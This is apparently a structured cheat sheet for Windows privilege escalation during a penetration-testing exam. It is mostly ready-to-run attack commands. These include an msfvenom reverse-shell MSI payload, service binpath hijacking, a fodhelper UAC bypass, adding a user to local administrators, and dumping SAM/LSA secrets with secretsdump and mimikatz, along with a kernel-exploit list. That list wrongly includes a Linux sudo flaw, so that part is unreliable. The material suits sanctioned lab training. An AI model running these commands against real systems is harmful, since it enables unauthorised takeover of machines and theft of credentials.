name: Argha Dey Windows Privilege Escalation Methodology
description: Quick Decision Flow for the Exam: Get shell → systeminfo/whoami /priv → WinPEAS/PowerUp → SeImpersonate check → service/registry/scheduled task perms → kernel CVEs. Includes A-Z technique catalogue (AlwaysInstallElevated, Unquoted Service Paths, DLL Hijacking, Potato Family, UAC Bypass, GPP, etc.) and kernel exploit catalogue.
examHabits: Always check patch level first (wmic qfe) — kernel exploits can BSOD the target
Check SeImpersonatePrivilege first — fast win via PrintSpoofer/GodPotato if service account
Check services/registry/scheduled tasks/file perms — safe wins, no crash risk
Only reach for kernel CVE if OS is unpatched and no config-based win exists
Confirm final privilege with whoami /priv + whoami /groups and grab proof (flag/hash)
Document: technique used, CVE ID, affected component, command sequence, and remediation
quickRef: systeminfo; whoami /priv; winPEAS.exe; PowerUp Invoke-AllChecks; PrintSpoofer.exe -c cmd (if SeImpersonate); accesschk.exe for service perms

decisionPoints.action: systeminfo; whoami /priv; whoami /groups; whoami /all; hostname; wmic qfe get Caption,Description,HotFixID,InstalledOn; wmic os get osarchitecture; ver; ipconfig /all; netstat -ano; net user; net localgroup administrators
decisionPoints.fallback: Run winPEASx64.exe + PowerUp Invoke-AllChecks + Seatbelt -group=all + Sherlock Find-AllVulns

decisionPoints.action: Cross-reference OS build against CVE database (MS17-010, BlueKeep, PrintNightmare, etc.)
decisionPoints.fallback: Use Watson.exe or Windows-Exploit-Suggester.py against systeminfo output

decisionPoints.condition: Both MSI install registry keys set to 1
decisionPoints.action: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi; msiexec /quiet /qn /i evil.msi

decisionPoints.condition: Service path unquoted with spaces (C:\Program Files\My App\service.exe)
decisionPoints.action: icacls 'C:\Program Files\My App'; drop malicious Program.exe in writable parent; sc start 'VulnSvc'

decisionPoints.condition: Service/app loads DLL from writable non-system directory
decisionPoints.action: Find-ProcessDLLHijack / Find-PathDLLHijack (PowerUp); craft malicious DLL with matching exports; msfvenom -f dll -o hijack.dll
decisionPoints.fallback: Process Monitor to find writable DLL load paths

decisionPoints.action: PrintSpoofer.exe -i -c cmd (most reliable on modern Win10/Server2016+); or GodPotato.exe -cmd 'C:\payload.exe'
accesschk.exe -uwcqv 'Authenticated Users' * -svc; sc config VulnSvc binpath= 'C:\payload.exe'; sc start VulnSvc
decisionPoints.fallback: PowerUp: Get-ModifiableService -Verbose; Invoke-ServiceAbuse -Name 'VulnSvc' -Command 'net localgroup administrators user /add'

decisionPoints.condition: Task runs as SYSTEM/admin with writable script
decisionPoints.fallback: reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run; if writable, replace with payload

decisionPoints.condition: User is local admin but running medium integrity
decisionPoints.action: fodhelper.exe bypass: reg add HKCU\Software\Classes\ms-settings\shell\open\command /d 'C:\payload.exe' /f; reg add ... DelegateExecute /f; fodhelper.exe

steps.phase: Phase 9 - LSA Secrets & SAM Dump (for lateral movement)

decisionPoints.action: reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM system.hive; reg save HKLM\SECURITY security.hive; secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL; or mimikatz lsadump::sam; lsadump::secrets

decisionPoints.condition: OS is unpatched, systeminfo confirms vulnerable build
decisionPoints.action: MS08-067 (Conficker); MS16-032 (Secondary Logon); MS17-010 (EternalBlue); CVE-2019-0708 (BlueKeep); CVE-2020-1472 (Zerologon); CVE-2021-1675 (PrintNightmare); CVE-2021-1732 (Win32k); CVE-2021-3156 (Baron Samedit)
decisionPoints.fallback: Metasploit: local_exploit_suggester; or manual: searchsploit <cve> → -m → compile/run PoC

steps.phase: Phase 11 - Quick Decision Flow for the Exam

decisionPoints.action: systeminfo + whoami /priv + whoami /groups → WinPEAS/PowerUp/Seatbelt/Sherlock in parallel → SeImpersonate first (PrintSpoofer) → service/registry/scheduled task/file perms → kernel CVE only if unpatched
decisionPoints.fallback: Always confirm final privilege with whoami /priv + whoami /groups + type C:\Users\Administrator\Desktop\root.txt
